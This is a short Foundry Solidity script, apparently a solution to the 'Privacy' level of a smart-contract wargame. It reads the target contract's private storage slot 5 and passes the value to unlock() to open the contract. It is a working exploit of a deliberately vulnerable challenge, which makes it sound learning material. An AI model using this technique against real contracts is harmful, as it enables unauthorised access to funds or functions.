// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import "../challenges/Ilevel12.sol";

contract POC is Script {
    Privacy level12 = Privacy(0xaDeD3F5a4bf3951994F75b2bf1F4b62C320223D6);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        bytes32 myKey = vm.load(address(level12), bytes32(uint256(5)));
        level12.unlock(bytes16(myKey));
        vm.stopBroadcast();
    }
}
